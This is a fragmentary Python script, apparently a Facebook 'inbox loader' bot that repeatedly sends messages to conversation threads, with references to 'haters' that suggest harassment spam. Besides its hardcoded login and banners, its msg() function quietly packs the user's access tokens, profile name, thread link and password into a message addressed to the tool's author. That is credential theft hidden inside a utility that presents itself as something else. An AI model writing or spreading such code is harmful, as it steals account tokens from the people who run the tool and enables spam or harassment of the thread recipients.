...
if int:
    print('''\033[1;37m---------------------------------------------------------------------\n''')
    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = Ashish ]=-''')
    ...
    print('''\033[1;37m[#] (^^^) The Tool Maker  Increadable boii == > [ Ashish Here ]\n''')
...
while attemps < 12345677901:
    ...
    if username == 'Ashish' and password == 'Mayra':
        print(' \033[0;95mSahii Haii Bhai.')
        os.system('espeak -a 300 " Welcome To Ashish Tool Enjoy Karo"')
        break
    else:
        print(' Username Or Password Galat Hai Try Karo Firse..!! ')
        os.system('espeak -a 300 " Password Galat Hai Ashish Se Pucho"')
        attemps += 1
        continue
os.system('clear')
pass
...
def msg():
		parameters = {
			...
			'message': 'Hello Ashish Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
		}
		try:
...
while True:
		try:
			...
			print(BOLD + RED + "\033[1;31;1m[#]] Net Band Hogya Bhai : Message  {} Of Convo {} Failed To Send. {}: {}".format(
				message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
			e = datetime.now()
			print (e.strftime("[#] Alone Ashish iinxide | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
			sleep(10)
			liness()
else:
